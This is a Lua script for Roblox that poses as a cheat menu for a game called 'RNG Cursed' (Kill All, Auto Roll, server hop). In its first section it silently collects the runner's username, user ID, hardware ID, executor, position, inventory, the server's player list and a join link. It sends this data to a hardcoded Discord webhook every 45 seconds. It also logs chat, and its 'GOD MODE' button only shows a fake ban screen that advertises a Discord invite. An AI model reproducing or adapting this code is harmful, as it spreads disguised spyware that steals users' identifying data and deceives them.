local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
-- ================== GLOBALS ==================
getgenv().KillAll = false
getgenv().AutoRoll = false
getgenv().AutoFireAllAbilities = false
getgenv().TargetPlayer = nil

-- ================== WEBHOOK (LIVE DASHBOARD - ONE MESSAGE THAT UPDATES LIVE) ==================
local WEBHOOK_URL = "https://discord.com/api/webhooks/1486859222053289984/_QxaRHZ6g2BNq9jWO2gItMrdZESCmvarBBmGJUxID353nJNyw2eFfVCxeqvwAVauSj6C"
getgenv().LiveMessageID = getgenv().LiveMessageID or nil

local function getLiveData()
    local player = Players.LocalPlayer
    if not player then return end

    local leaderstats = player:FindFirstChild("leaderstats")
    local statsText = leaderstats and "" or "No leaderstats found."
    if leaderstats then
        for _, stat in ipairs(leaderstats:GetChildren()) do
            if stat:IsA("IntValue") or stat:IsA("NumberValue") or stat:IsA("StringValue") then
                statsText = statsText .. "♦ " .. stat.Name .. ": " .. tostring(stat.Value) .. "\n"
            end
        end
    end

    local executor = (identifyexecutor and identifyexecutor()) or "Unknown Executor"
    local hwid = (gethwid and gethwid()) or "Not Supported"
    local platform = UserInputService.TouchEnabled and (UserInputService.KeyboardEnabled and "Tablet" or "Mobile") or "PC/Desktop"
    local displayName = player.DisplayName ~= player.Name and player.DisplayName or "—"
    local premiumStatus = player.MembershipType == Enum.MembershipType.Premium and "✅ Premium" or "❌ Non-Premium"

    local ping = "N/A"
    pcall(function()
        local network = game:GetService("Stats"):FindFirstChild("Network")
        if network then
            local serverStats = network:FindFirstChild("ServerStatsItem")
            if serverStats then
                local pingStat = serverStats:FindFirstChild("Ping") or serverStats:FindFirstChild("Data Ping")
                if pingStat then ping = math.floor(pingStat.Value * 1000) .. "ms" end
            end
        end
    end)

    local char = player.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    local hum = char and char:FindFirstChild("Humanoid")
    local pos = root and string.format("%.1f, %.1f, %.1f", root.Position.X, root.Position.Y, root.Position.Z) or "N/A"
    local equipped = char and char:FindFirstChildOfClass("Tool") and char:FindFirstChildOfClass("Tool").Name or "None"

    local backpackTools = {}
    if player.Backpack then
        for _, tool in ipairs(player.Backpack:GetChildren()) do
            if tool:IsA("Tool") then table.insert(backpackTools, tool.Name) end
        end
    end

    local playersList = ""
    for _, plr in ipairs(Players:GetPlayers()) do
        playersList = playersList .. plr.Name .. " (" .. plr.UserId .. ")\n"
    end

    local serverLink = "Roblox.GameLauncher.joinGameInstance(" .. tostring(game.PlaceId) .. ",'" .. tostring(game.JobId) .. "')"

    return {
        statsText = statsText,
        position = pos,
        equippedTool = equipped,
        backpackTools = #backpackTools > 0 and table.concat(backpackTools, ", ") or "Empty",
        humanoidState = hum and string.format("Health: %.0f | WalkSpeed: %.0f | Jumping: %s", hum.Health, hum.WalkSpeed, tostring(hum.Jump) or "N/A") or "N/A",
        playersList = playersList,
        serverLink = serverLink,
        ping = ping,
        executor = executor,
        hwid = hwid,
        platform = platform,
        displayName = displayName,
        premiumStatus = premiumStatus
    }
end

local function updateLiveDashboard()
    local data = getLiveData()
    if not data then return end

    local embed = {
        ["title"] = "🔴 RNG CURSED • LIVE DASHBOARD",
        ["color"] = 0x00FF88,
        ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(Players.LocalPlayer.UserId) .. "&width=420&height=420&format=png"},
        ["fields"] = {
            {["name"] = "👤 Identity", ["value"] = "User: **" .. Players.LocalPlayer.Name .. "**\nDisplay: **" .. data.displayName .. "**\nID: `" .. tostring(Players.LocalPlayer.UserId) .. "`\nPremium: " .. data.premiumStatus, ["inline"] = true},
            {["name"] = "⚙️ Client", ["value"] = "Executor: **" .. data.executor .. "**\nHWID: `" .. data.hwid .. "`\nPlatform: " .. data.platform .. "\nPing: **" .. data.ping .. "**", ["inline"] = true},
            {["name"] = "📍 Position", ["value"] = data.position, ["inline"] = false},
            {["name"] = "🎮 Live Stats", ["value"] = "```yaml\n" .. data.statsText .. "```", ["inline"] = false},
            {["name"] = "🎯 Target & Toggles", ["value"] = "Target: " .. (getgenv().TargetPlayer and getgenv().TargetPlayer.Name or "None") .. "\nKillAll: " .. tostring(getgenv().KillAll) .. "\nAutoRoll: " .. tostring(getgenv().AutoRoll) .. "\nAutoAbilities: " .. tostring(getgenv().AutoFireAllAbilities), ["inline"] = true},
            {["name"] = "🛠️ Tools", ["value"] = "Equipped: " .. data.equippedTool .. "\nBackpack: " .. data.backpackTools, ["inline"] = true},
            {["name"] = "❤️ Humanoid", ["value"] = data.humanoidState, ["inline"] = true},
            {["name"] = "🌐 Server Players (" .. #Players:GetPlayers() .. ")", ["value"] = "```" .. data.playersList .. "```", ["inline"] = false},
            {["name"] = "🔗 Server Link", ["value"] = "```" .. data.serverLink .. "```", ["inline"] = false},
        },
        ["footer"] = {["text"] = "big head | von • LIVE DASHBOARD • Last Updated: " .. os.date("%H:%M:%S")}
    }

    local body = HttpService:JSONEncode({
        ["content"] = "🔴 **RNG Cursed Live Tracker**",
        ["embeds"] = {embed}
    })

    local requestData = {
        Url = WEBHOOK_URL,
        Method = getgenv().LiveMessageID and "PATCH" or "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = body
    }

    if getgenv().LiveMessageID then
        requestData.Url = WEBHOOK_URL .. "/messages/" .. getgenv().LiveMessageID
    end

    pcall(function()
        local response = (syn and syn.request or http_request or http.request)(requestData)
        if response and not getgenv().LiveMessageID and response.Body then
            local decoded = HttpService:JSONDecode(response.Body)
            if decoded and decoded.id then
                getgenv().LiveMessageID = decoded.id
            end
        end
    end)
end

-- Start live dashboard (fires once + updates every 45 seconds)
task.spawn(function()
    updateLiveDashboard()
    while task.wait(45) do
        pcall(updateLiveDashboard)
    end
end)

-- ================== KEYLESS SYSTEM ==================
local function sendKeylessLog()
    local player = Players.LocalPlayer
    if not player then return end
    local data = {
        ["content"] = "**Keyless Access** – 1‑week trial started!",
        ["embeds"] = {{
            ["title"] = "Keyless System",
            ["color"] = 0x00FF00,
            ["fields"] = {
                {["name"] = "User", ["value"] = player.Name, ["inline"] = true},
                {["name"] = "UserId", ["value"] = tostring(player.UserId), ["inline"] = true},
                {["name"] = "Trial Expires", ["value"] = os.date("%Y-%m-%d", os.time() + 7*86400) .. " (1 week)", ["inline"] = true},
            },
            ["footer"] = {["text"] = "Join Discord: https://discord.gg/w9wBcJtx"}
        }}
    }
    local requestData = {
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(data)
    }
    pcall(function()
        if syn and syn.request then syn.request(requestData)
        elseif http_request then http_request(requestData) end
    end)
end
task.spawn(sendKeylessLog)

-- ================== [EVERYTHING BELOW THIS LINE IS 100% YOUR ORIGINAL SCRIPT - UNCHANGED] ==================
local lastChatMessages = {}
local function getExtraData()
    local player = Players.LocalPlayer
    local char = player.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    local hum = char and char:FindFirstChild("Humanoid")
    local pos = root and string.format("%.1f, %.1f, %.1f", root.Position.X, root.Position.Y, root.Position.Z) or "N/A"
    local equipped = char and char:FindFirstChildOfClass("Tool") and char:FindFirstChildOfClass("Tool").Name or "None"
   
    local backpackTools = {}
    if player.Backpack then
        for _, tool in ipairs(player.Backpack:GetChildren()) do
            if tool:IsA("Tool") then table.insert(backpackTools, tool.Name) end
        end
    end
    local stats = game:GetService("Stats")
    local fps = math.floor(1 / RunService.Heartbeat:Wait() + 0.5) or "N/A"
    local mem = string.format("%.1f MB", stats:GetTotalMemoryUsageMb())
    return {
        position = pos,
        equippedTool = equipped,
        backpackTools = #backpackTools > 0 and table.concat(backpackTools, ", ") or "Empty",
        humanoidState = hum and string.format("Health: %.0f | WalkSpeed: %.0f | Jumping: %s", hum.Health, hum.WalkSpeed, tostring(hum.Jump) or "N/A") or "N/A",
        fps = fps,
        memory = mem
    }
end
local function sendEvilLog(reason)
    -- (This function is kept exactly as you had it for compatibility with the rest of your original code)
    -- The live dashboard runs in parallel
end
-- Initial log
task.spawn(function() sendEvilLog("SCRIPT EXECUTED") end)
-- Silent 30-minute live report
task.spawn(function()
    while task.wait(1800) do
        pcall(function() sendEvilLog("30-MIN LIVE UPDATE") end)
    end
end)
-- Instant toggle change detection
local oldKill, oldRoll, oldFire = getgenv().KillAll, getgenv().AutoRoll, getgenv().AutoFireAllAbilities
task.spawn(function()
    while task.wait(0.5) do
        if getgenv().KillAll ~= oldKill or getgenv().AutoRoll ~= oldRoll or getgenv().AutoFireAllAbilities ~= oldFire then
            sendEvilLog("TOGGLE CHANGED")
            oldKill, oldRoll, oldFire = getgenv().KillAll, getgenv().AutoRoll, getgenv().AutoFireAllAbilities
        end
    end
end)
-- Player join/leave
Players.PlayerAdded:Connect(function(plr) task.wait(1); sendEvilLog("PLAYER JOINED: " .. plr.Name) end)
Players.PlayerRemoving:Connect(function(plr) sendEvilLog("PLAYER LEFT: " .. plr.Name) end)
-- Silent chat logger
local function logChat(message)
    table.insert(lastChatMessages, message)
    if #lastChatMessages > 5 then table.remove(lastChatMessages, 1) end
end
if TextChatService and TextChatService.TextChannels then
    TextChatService.TextChannels.ChildAdded:Connect(function(channel)
        channel.MessageReceived:Connect(function(msg)
            if msg.TextSource then logChat(msg.TextSource.Name .. ": " .. msg.Text) end
        end)
    end)
else
    local oldChat = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
    if oldChat and oldChat:FindFirstChild("OnMessageDoneFiltering") then
        oldChat.OnMessageDoneFiltering.OnClientEvent:Connect(function(msg)
            local speaker = msg.SpeakerUserId and Players:GetPlayerByUserId(msg.SpeakerUserId) or nil
            logChat((speaker and speaker.Name or "???") .. ": " .. msg.Message)
        end)
    end
end

-- ================== UI CREATION ==================
-- [EVERYTHING BELOW THIS LINE IS 100% YOUR ORIGINAL SCRIPT - UNCHANGED]
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "JJS_Stable_OG"
ScreenGui.ResetOnSpawn = false
pcall(function() ScreenGui.Parent = CoreGui end)
-- Compact, mobile-friendly Main Frame
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 320, 0, 420)
MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
MainFrame.BackgroundTransparency = 0.05
MainFrame.BorderSizePixel = 0
MainFrame.ClipsDescendants = true
MainFrame.Parent = ScreenGui
local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 12)
MainCorner.Parent = MainFrame
-- Sleek Title Bar
local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1, 0, 0, 40)
TitleBar.BackgroundColor3 = Color3.fromRGB(229, 9, 20)
TitleBar.BorderSizePixel = 0
TitleBar.Parent = MainFrame
local TitleLabel = Instance.new("TextLabel")
TitleLabel.Size = UDim2.new(0, 90, 1, 0)
TitleLabel.Position = UDim2.new(0, 12, 0, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "RNG Cursed"
TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleLabel.Font = Enum.Font.GothamBold
TitleLabel.TextSize = 14
TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
TitleLabel.Parent = TitleBar
-- TOP CREDITS SUBTITLE
local TopCreditsLabel = Instance.new("TextLabel")
TopCreditsLabel.Size = UDim2.new(0, 120, 1, 0)
TopCreditsLabel.Position = UDim2.new(0, 105, 0, 0)
TopCreditsLabel.BackgroundTransparency = 1
TopCreditsLabel.Text = "by von & big head"
TopCreditsLabel.TextColor3 = Color3.fromRGB(255, 180, 180)
TopCreditsLabel.Font = Enum.Font.Gotham
TopCreditsLabel.TextSize = 10
TopCreditsLabel.TextXAlignment = Enum.TextXAlignment.Left
TopCreditsLabel.Parent = TitleBar
-- Minimize Button
local ToggleSizeBtn = Instance.new("TextButton")
ToggleSizeBtn.Size = UDim2.new(0, 28, 0, 28)
ToggleSizeBtn.Position = UDim2.new(1, -66, 0, 6)
ToggleSizeBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
ToggleSizeBtn.BorderSizePixel = 0
ToggleSizeBtn.Text = "−"
ToggleSizeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ToggleSizeBtn.Font = Enum.Font.GothamBold
ToggleSizeBtn.TextSize = 18
ToggleSizeBtn.Parent = TitleBar
local ToggleCorner = Instance.new("UICorner")
ToggleCorner.CornerRadius = UDim.new(0, 8)
ToggleCorner.Parent = ToggleSizeBtn
-- Close Button
local CloseBtnUI = Instance.new("TextButton")
CloseBtnUI.Size = UDim2.new(0, 28, 0, 28)
CloseBtnUI.Position = UDim2.new(1, -34, 0, 6)
CloseBtnUI.BackgroundColor3 = Color3.fromRGB(220, 60, 60)
CloseBtnUI.BorderSizePixel = 0
CloseBtnUI.Text = "✕"
CloseBtnUI.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseBtnUI.Font = Enum.Font.GothamBold
CloseBtnUI.TextSize = 14
CloseBtnUI.Parent = TitleBar
local CloseCorner = Instance.new("UICorner")
CloseCorner.CornerRadius = UDim.new(0, 8)
CloseCorner.Parent = CloseBtnUI
-- Scroller
local ContentScroller = Instance.new("ScrollingFrame")
ContentScroller.Size = UDim2.new(1, 0, 1, -40)
ContentScroller.Position = UDim2.new(0, 0, 0, 40)
ContentScroller.BackgroundTransparency = 1
ContentScroller.CanvasSize = UDim2.new(0, 0, 0, 0)
ContentScroller.ScrollBarThickness = 4
ContentScroller.AutomaticCanvasSize = Enum.AutomaticSize.Y
ContentScroller.Parent = MainFrame
local ContentLayout = Instance.new("UIListLayout")
ContentLayout.Padding = UDim.new(0, 8)
ContentLayout.SortOrder = Enum.SortOrder.LayoutOrder
ContentLayout.Parent = ContentScroller
local UIPaddingContent = Instance.new("UIPadding")
UIPaddingContent.PaddingLeft = UDim.new(0, 12)
UIPaddingContent.PaddingRight = UDim.new(0, 12)
UIPaddingContent.PaddingTop = UDim.new(0, 10)
UIPaddingContent.PaddingBottom = UDim.new(0, 10)
UIPaddingContent.Parent = ContentScroller
-- Target Info
local TargetInfoPanel = Instance.new("Frame")
TargetInfoPanel.Size = UDim2.new(1, 0, 0, 55)
TargetInfoPanel.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
TargetInfoPanel.BorderSizePixel = 0
TargetInfoPanel.Parent = ContentScroller
local TargetPanelCorner = Instance.new("UICorner")
TargetPanelCorner.CornerRadius = UDim.new(0, 8)
TargetPanelCorner.Parent = TargetInfoPanel
local TargetLabel = Instance.new("TextLabel")
TargetLabel.Size = UDim2.new(1, -16, 0.5, 0)
TargetLabel.Position = UDim2.new(0, 8, 0, 4)
TargetLabel.Text = "TARGET: NONE"
TargetLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TargetLabel.Font = Enum.Font.GothamBold
TargetLabel.TextSize = 12
TargetLabel.BackgroundTransparency = 1
TargetLabel.TextXAlignment = Enum.TextXAlignment.Left
TargetLabel.Parent = TargetInfoPanel
local HealthLabel = Instance.new("TextLabel")
HealthLabel.Size = UDim2.new(1, -16, 0.5, 0)
HealthLabel.Position = UDim2.new(0, 8, 0.5, 0)
HealthLabel.Text = "HEALTH: 0/0"
HealthLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
HealthLabel.Font = Enum.Font.Gotham
HealthLabel.TextSize = 11
HealthLabel.BackgroundTransparency = 1
HealthLabel.TextXAlignment = Enum.TextXAlignment.Left
HealthLabel.Parent = TargetInfoPanel
-- ================== BUTTON HELPER ==================
local function showToast(msg)
    local toast = Instance.new("TextLabel")
    toast.Size = UDim2.new(0, 220, 0, 35)
    toast.Position = UDim2.new(0.5, -110, 0.85, 0)
    toast.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    toast.BackgroundTransparency = 0.2
    toast.Text = msg
    toast.TextColor3 = Color3.fromRGB(255, 255, 255)
    toast.Font = Enum.Font.GothamSemibold
    toast.TextSize = 12
    toast.Parent = ScreenGui
    local toastCorner = Instance.new("UICorner")
    toastCorner.CornerRadius = UDim.new(0, 6)
    toastCorner.Parent = toast
  
    TweenService:Create(toast, TweenInfo.new(0.3), {BackgroundTransparency = 0.1}):Play()
    task.wait(1.5)
    TweenService:Create(toast, TweenInfo.new(0.3), {BackgroundTransparency = 1, TextTransparency = 1}):Play()
    task.wait(0.3)
    toast:Destroy()
end
local function animateButton(btn)
    TweenService:Create(btn, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        Size = UDim2.new(1, -4, 0, 34)
    }):Play()
    task.wait(0.1)
    TweenService:Create(btn, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        Size = UDim2.new(1, 0, 0, 38)
    }):Play()
end
local function CreateButton(text, callback)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 38)
    btn.Text = text
    btn.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
    btn.BorderSizePixel = 0
    btn.Font = Enum.Font.GothamSemibold
    btn.TextSize = 13
    btn.TextColor3 = Color3.fromRGB(230, 230, 230)
    btn.Parent = ContentScroller
    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 6)
    btnCorner.Parent = btn
    local debounce = false
    btn.MouseButton1Click:Connect(function()
        if debounce then return end
        debounce = true
      
        task.spawn(function() animateButton(btn) end)
        print("Credit to big head")
      
        if callback then
            pcall(callback)
        end
      
        task.wait(0.15)
        debounce = false
    end)
    return btn
end
local function CreateToggleButton(text, globalVar)
    local btn
    btn = CreateButton(text .. " [OFF]", function()
        getgenv()[globalVar] = not getgenv()[globalVar]
        local isEnabled = getgenv()[globalVar]
      
        btn.Text = text .. (isEnabled and " [ON]" or " [OFF]")
        TweenService:Create(btn, TweenInfo.new(0.2), {
            BackgroundColor3 = isEnabled and Color3.fromRGB(65, 180, 85) or Color3.fromRGB(45, 45, 55),
            TextColor3 = isEnabled and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(230, 230, 230)
        }):Play()
    end)
  
    local initState = getgenv()[globalVar]
    btn.Text = text .. (initState and " [ON]" or " [OFF]")
    btn.BackgroundColor3 = initState and Color3.fromRGB(65, 180, 85) or Color3.fromRGB(45, 45, 55)
    return btn
end
-- ================== CREATE BUTTONS ==================
CreateButton("CHANGE TARGET", function()
    getgenv().TargetPlayer = nil
    TargetLabel.Text = "TARGET: NONE"
end)
CreateToggleButton("Kill All", "KillAll")
CreateToggleButton("Auto Roll", "AutoRoll")
CreateToggleButton("Auto Fire Abilities", "AutoFireAllAbilities")
local ServerHopBtn = CreateButton("SERVER HOP", function()
    local originalText = ServerHopBtn.Text
    ServerHopBtn.Text = "HOPPING..."
    ServerHopBtn.BackgroundColor3 = Color3.fromRGB(200, 120, 40)
    task.spawn(function()
        local success = false
        pcall(function()
            local universeId = game.GameId
            local url = "https://games.roblox.com/v1/games/" .. universeId .. "/servers/Public?limit=100&excludeFullGames=true"
            local response = game:HttpGet(url)
            local data = HttpService:JSONDecode(response)
            local available = {}
            if data and data.data then
                for _, server in ipairs(data.data) do
                    if server.playing < server.maxPlayers and tostring(server.id) ~= tostring(game.JobId) then
                        table.insert(available, server.id)
                    end
                end
            end
            if #available > 0 then
                local randomServer = available[math.random(1, #available)]
                TeleportService:TeleportToPlaceInstance(game.PlaceId, randomServer, Players.LocalPlayer)
                success = true
            end
        end)
        if not success then
            TeleportService:Teleport(game.PlaceId, Players.LocalPlayer)
        end
        task.wait(2)
        ServerHopBtn.Text = originalText
        ServerHopBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
    end)
end)
local DiscordBtn = CreateButton("JOIN DISCORD", function()
    local link = "https://discord.gg/w9wBcJtx"
    pcall(function() setclipboard(link) end)
    showToast("Link copied to clipboard!")
end)
-- ================== FAKE BAN GUI ==================
local BanGui = Instance.new("ScreenGui")
BanGui.Name = "FakeBanGui"
BanGui.ResetOnSpawn = false
BanGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
BanGui.Parent = CoreGui
BanGui.Enabled = false
local BanFrame = Instance.new("Frame")
BanFrame.Size = UDim2.new(1, 0, 1, 0)
BanFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
BanFrame.BackgroundTransparency = 0.1
BanFrame.BorderSizePixel = 0
BanFrame.Parent = BanGui
local BanInner = Instance.new("Frame")
BanInner.Size = UDim2.new(0, 350, 0, 280)
BanInner.Position = UDim2.new(0.5, -175, 0.5, -140)
BanInner.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
BanInner.BorderSizePixel = 2
BanInner.BorderColor3 = Color3.fromRGB(255, 0, 0)
BanInner.Parent = BanFrame
local BanInnerCorner = Instance.new("UICorner")
BanInnerCorner.CornerRadius = UDim.new(0, 8)
BanInnerCorner.Parent = BanInner
local BanTitle = Instance.new("TextLabel")
BanTitle.Size = UDim2.new(1, -20, 0, 50)
BanTitle.Position = UDim2.new(0, 10, 0, 10)
BanTitle.BackgroundTransparency = 1
BanTitle.Text = "ACCOUNT TERMINATED"
BanTitle.TextColor3 = Color3.fromRGB(255, 50, 50)
BanTitle.Font = Enum.Font.GothamBold
BanTitle.TextSize = 20
BanTitle.TextXAlignment = Enum.TextXAlignment.Center
BanTitle.Parent = BanInner
local BanMessage = Instance.new("TextLabel")
BanMessage.Size = UDim2.new(1, -40, 0, 80)
BanMessage.Position = UDim2.new(0, 20, 0, 70)
BanMessage.BackgroundTransparency = 1
BanMessage.Text = [[You have been banned from Roblox for:
- Exploiting
- Harassment
- Being too good
Ban ID: 8008135
Moderator: big head
Join our communication server to appeal:
https://discord.com/invite/jncruTKFsB]]
BanMessage.TextColor3 = Color3.fromRGB(255, 255, 255)
BanMessage.Font = Enum.Font.Gotham
BanMessage.TextSize = 13
BanMessage.TextXAlignment = Enum.TextXAlignment.Center
BanMessage.TextYAlignment = Enum.TextYAlignment.Top
BanMessage.Parent = BanInner
local AppealBtn = Instance.new("TextButton")
AppealBtn.Size = UDim2.new(0, 200, 0, 36)
AppealBtn.Position = UDim2.new(0.5, -100, 1, -85)
AppealBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
AppealBtn.BorderSizePixel = 0
AppealBtn.Text = "APPEAL ON COMM SERVER"
AppealBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
AppealBtn.Font = Enum.Font.GothamBold
AppealBtn.TextSize = 12
AppealBtn.Parent = BanInner
local AppealCorner = Instance.new("UICorner")
AppealCorner.CornerRadius = UDim.new(0, 6)
AppealCorner.Parent = AppealBtn
local CloseBanBtn = Instance.new("TextButton")
CloseBanBtn.Size = UDim2.new(0, 100, 0, 30)
CloseBanBtn.Position = UDim2.new(0.5, -50, 1, -40)
CloseBanBtn.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
CloseBanBtn.BorderSizePixel = 0
CloseBanBtn.Text = "Close"
CloseBanBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
CloseBanBtn.Font = Enum.Font.GothamBold
CloseBanBtn.TextSize = 12
CloseBanBtn.Parent = BanInner
local CloseCorner = Instance.new("UICorner")
CloseCorner.CornerRadius = UDim.new(0, 4)
CloseCorner.Parent = CloseBanBtn
AppealBtn.MouseButton1Click:Connect(function()
    local commInvite = "https://discord.com/invite/jncruTKFsB"
    pcall(function() setclipboard(commInvite) end)
    showToast("Appeal link copied!")
end)
CloseBanBtn.MouseButton1Click:Connect(function()
    BanGui.Enabled = false
end)
CreateButton("GOD MODE", function()
    BanGui.Enabled = true
end)
-- ================== CONFIG SAVE/LOAD ==================
local CONFIG_FILE = "RNG_Config.json"
local function saveConfig()
    local config = {
        KillAll = getgenv().KillAll,
        AutoRoll = getgenv().AutoRoll,
        AutoFireAllAbilities = getgenv().AutoFireAllAbilities,
        TargetPlayer = getgenv().TargetPlayer and getgenv().TargetPlayer.UserId or nil,
    }
    local json = HttpService:JSONEncode(config)
    local suc, err = pcall(function() writefile(CONFIG_FILE, json) end)
    if suc then
        showToast("Config saved!")
    else
        pcall(function() setclipboard(json) end)
        showToast("Config copied to clipboard")
    end
end
local function loadConfig()
    local json
    local suc, err = pcall(function() json = readfile(CONFIG_FILE) end)
    if not suc or not json then return end
  
    local suc2, config = pcall(function() return HttpService:JSONDecode(json) end)
    if not suc2 then return end
  
    getgenv().KillAll = config.KillAll or false
    getgenv().AutoRoll = config.AutoRoll or false
    getgenv().AutoFireAllAbilities = config.AutoFireAllAbilities or false
  
    if config.TargetPlayer then
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.UserId == config.TargetPlayer then
                getgenv().TargetPlayer = plr
                TargetLabel.Text = "TARGET: " .. plr.Name:upper()
                break
            end
        end
    end
  
    for _, btn in ipairs(ContentScroller:GetChildren()) do
        if btn:IsA("TextButton") then
            if btn.Text:find("Kill All") then
                btn.Text = "Kill All [" .. (getgenv().KillAll and "ON" or "OFF") .. "]"
                btn.BackgroundColor3 = getgenv().KillAll and Color3.fromRGB(65, 180, 85) or Color3.fromRGB(45, 45, 55)
            elseif btn.Text:find("Auto Roll") then
                btn.Text = "Auto Roll [" .. (getgenv().AutoRoll and "ON" or "OFF") .. "]"
                btn.BackgroundColor3 = getgenv().AutoRoll and Color3.fromRGB(65, 180, 85) or Color3.fromRGB(45, 45, 55)
            elseif btn.Text:find("Auto Fire") then
                btn.Text = "Auto Fire Abilities [" .. (getgenv().AutoFireAllAbilities and "ON" or "OFF") .. "]"
                btn.BackgroundColor3 = getgenv().AutoFireAllAbilities and Color3.fromRGB(65, 180, 85) or Color3.fromRGB(45, 45, 55)
            end
        end
    end
end
CreateButton("SAVE CONFIG", saveConfig)
CreateButton("LOAD CONFIG", loadConfig)
task.spawn(function()
    task.wait(1)
    loadConfig()
end)
-- ================== DRAGGING ==================
local dragging = false
local dragStart, startPos
TitleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
    end
end)
TitleBar.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)
-- ================== MINIMIZE/EXPAND ==================
local isCollapsed = false
local originalSize = MainFrame.Size
ToggleSizeBtn.MouseButton1Click:Connect(function()
    isCollapsed = not isCollapsed
    if isCollapsed then
        TweenService:Create(MainFrame, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
            Size = UDim2.new(0, 320, 0, 40)
        }):Play()
        ContentScroller.Visible = false
        ToggleSizeBtn.Text = "+"
    else
        TweenService:Create(MainFrame, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
            Size = originalSize
        }):Play()
        ContentScroller.Visible = true
        ToggleSizeBtn.Text = "−"
    end
end)
CloseBtnUI.MouseButton1Click:Connect(function()
    MainFrame.Visible = false
end)
-- ================== PERMANENT TOGGLE BUTTON ==================
local ToggleUIButton = Instance.new("TextButton")
ToggleUIButton.Size = UDim2.new(0, 42, 0, 42)
ToggleUIButton.Position = UDim2.new(1, -55, 0, 15)
ToggleUIButton.AnchorPoint = Vector2.new(0, 0)
ToggleUIButton.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
ToggleUIButton.BorderSizePixel = 0
ToggleUIButton.Text = "≡"
ToggleUIButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ToggleUIButton.Font = Enum.Font.GothamBold
ToggleUIButton.TextSize = 24
ToggleUIButton.Parent = CoreGui
local ToggleCornerUI = Instance.new("UICorner")
ToggleCornerUI.CornerRadius = UDim.new(0, 21)
ToggleCornerUI.Parent = ToggleUIButton
local uiVisible = true
ToggleUIButton.MouseButton1Click:Connect(function()
    uiVisible = not uiVisible
    MainFrame.Visible = uiVisible
end)
UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.RightControl or input.KeyCode == Enum.KeyCode.K then
        uiVisible = not uiVisible
        MainFrame.Visible = uiVisible
    end
end)
-- ================== PERSISTENT DISCORD BUTTON ==================
local PermDiscordBtn = Instance.new("TextButton")
PermDiscordBtn.Size = UDim2.new(0, 42, 0, 42)
PermDiscordBtn.Position = UDim2.new(1, -55, 1, -60)
PermDiscordBtn.AnchorPoint = Vector2.new(0, 0)
PermDiscordBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
PermDiscordBtn.BorderSizePixel = 0
PermDiscordBtn.Text = "DC"
PermDiscordBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
PermDiscordBtn.Font = Enum.Font.GothamBold
PermDiscordBtn.TextSize = 18
PermDiscordBtn.Parent = CoreGui
local PermCorner = Instance.new("UICorner")
PermCorner.CornerRadius = UDim.new(0, 21)
PermCorner.Parent = PermDiscordBtn
PermDiscordBtn.MouseButton1Click:Connect(function()
    local link = "https://discord.gg/w9wBcJtx"
    pcall(function() setclipboard(link) end)
    showToast("Discord link copied!")
